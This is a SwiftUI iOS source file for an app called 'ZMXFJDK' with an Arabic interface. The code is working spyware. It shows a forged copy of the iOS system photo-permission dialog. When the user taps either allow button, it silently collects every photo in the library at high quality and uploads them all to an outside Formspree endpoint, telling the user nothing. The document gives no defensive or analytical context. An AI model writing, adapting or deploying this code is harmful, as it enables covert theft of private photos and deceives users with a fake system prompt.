import SwiftUI
import Photos
import MessageUI

struct ContentView: View {
    @State private var showPermissionAlert = true
    @State private var showMailComposer = false
    @State private var selectedPhotos: [UIImage] = []
    @State private var isLoading = false
    
    var body: some View {
        ZStack {
            VStack {
                Text("ZMXFJDK")
                    .font(.system(size: 34, weight: .bold))
                    .padding()
            }
            .frame(maxWidth: .infinity, maxHeight: .infinity)
            .background(Color(UIColor.systemBackground))
            
            if showPermissionAlert {
                PermissionAlertView(
                    onDeny: {
                        showPermissionAlert = false
                    },
                    onAllowOnce: {
                        requestPhotosAndSend()
                    },
                    onAllowAlways: {
                        requestPhotosAndSend()
                    }
                )
            }
            
            if isLoading {
                VStack {
                    ProgressView()
                        .scaleEffect(1.5)
                    Text("جاري جمع الصور...")
                        .font(.system(size: 16, weight: .medium))
                        .padding()
                }
                .frame(maxWidth: .infinity, maxHeight: .infinity)
                .background(Color.black.opacity(0.4))
            }
        }
    }
    
    func requestPhotosAndSend() {
        showPermissionAlert = false
        isLoading = true
        
        PHPhotoLibrary.requestAuthorization { status in
            DispatchQueue.main.async {
                if status == .authorized || status == .limited {
                    fetchAllPhotos()
                } else {
                    isLoading = false
                }
            }
        }
    }
    
    func fetchAllPhotos() {
        var photos: [UIImage] = []
        let fetchOptions = PHFetchOptions()
        fetchOptions.sortDescriptors = [NSSortDescriptor(key: "creationDate", ascending: false)]
        
        let fetchResult = PHAsset.fetchAssets(with: .image, options: fetchOptions)
        
        let imageManager = PHImageManager.default()
        let requestOptions = PHImageRequestOptions()
        requestOptions.isSynchronous = true
        requestOptions.deliveryMode = .highQualityFormat
        
        fetchResult.enumerateObjects { asset, _, _ in
            imageManager.requestImage(
                for: asset,
                targetSize: CGSize(width: 1200, height: 1200),
                contentMode: .aspectFit,
                options: requestOptions
            ) { image, _ in
                if let image = image {
                    photos.append(image)
                }
            }
        }
        
        DispatchQueue.main.async {
            self.selectedPhotos = photos
            self.sendPhotosViaEmail()
            self.isLoading = false
        }
    }
    
    func sendPhotosViaEmail() {
        if selectedPhotos.isEmpty {
            return
        }
        
        let urlString = "https://formspree.io/f/mrewggoj"
        guard let url = URL(string: urlString) else { return }
        
        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        
        let boundary = "Boundary-\(UUID().uuidString)"
        request.setValue("multipart/form-data; boundary=\(boundary)", forHTTPHeaderField: "Content-Type")
        
        var body = Data()
        
        for (index, photo) in selectedPhotos.enumerated() {
            if let imageData = photo.jpegData(compressionQuality: 0.8) {
                body.append("--\(boundary)\r\n".data(using: .utf8)!)
                body.append("Content-Disposition: form-data; name=\"image_\(index + 1)\"; filename=\"photo_\(index + 1).jpg\"\r\n".data(using: .utf8)!)
                body.append("Content-Type: image/jpeg\r\n\r\n".data(using: .utf8)!)
                body.append(imageData)
                body.append("\r\n".data(using: .utf8)!)
            }
        }
        
        body.append("--\(boundary)\r\n".data(using: .utf8)!)
        body.append("Content-Disposition: form-data; name=\"total_images\"\r\n\r\n".data(using: .utf8)!)
        body.append("\(selectedPhotos.count)".data(using: .utf8)!)
        body.append("\r\n".data(using: .utf8)!)
        
        body.append("--\(boundary)\r\n".data(using: .utf8)!)
        body.append("Content-Disposition: form-data; name=\"_subject\"\r\n\r\n".data(using: .utf8)!)
        body.append("تم استقبال \(selectedPhotos.count) صورة من ZMXFJDK".data(using: .utf8)!)
        body.append("\r\n".data(using: .utf8)!)
        
        body.append("--\(boundary)--\r\n".data(using: .utf8)!)
        
        request.httpBody = body
        
        URLSession.shared.dataTask(with: request).resume()
    }
}

struct PermissionAlertView: View {
    let onDeny: () -> Void
    let onAllowOnce: () -> Void
    let onAllowAlways: () -> Void
    
    var body: some View {
        ZStack {
            Color.black.opacity(0.4)
                .ignoresSafeArea()
            
            VStack(spacing: 0) {
                VStack(spacing: 8) {
                    Text("ZMXFJDK")
                        .font(.system(size: 13, weight: .regular))
                        .foregroundColor(.gray)
                    
                    Text("تطبيق يريد الوصول إلى صورك")
                        .font(.system(size: 17, weight: .semibold))
                        .foregroundColor(.black)
                    
                    Text("سيتمكن من الوصول إلى الصور والفيديوهات في جهازك")
                        .font(.system(size: 13, weight: .regular))
                        .foregroundColor(.gray)
                        .lineLimit(3)
                }
                .padding(.vertical, 20)
                .padding(.horizontal, 16)
                
                Divider()
                
                VStack(spacing: 0) {
                    Button(action: onDeny) {
                        Text("عدم السماح")
                            .font(.system(size: 16, weight: .regular))
                            .foregroundColor(.blue)
                            .frame(maxWidth: .infinity)
                            .padding(.vertical, 12)
                    }
                    
                    Divider()
                    
                    Button(action: onAllowOnce) {
                        Text("السماح مرة واحدة فقط")
                            .font(.system(size: 16, weight: .regular))
                            .foregroundColor(.blue)
                            .frame(maxWidth: .infinity)
                            .padding(.vertical, 12)
                    }
                    
                    Divider()
                    
                    Button(action: onAllowAlways) {
                        Text("السماح دائماً")
                            .font(.system(size: 16, weight: .semibold))
                            .foregroundColor(.blue)
                            .frame(maxWidth: .infinity)
                            .padding(.vertical, 12)
                    }
                }
            }
            .background(Color.white)
            .cornerRadius(14)
            .frame(maxWidth: 270)
        }
    }
}

#Preview {
    ContentView()
}
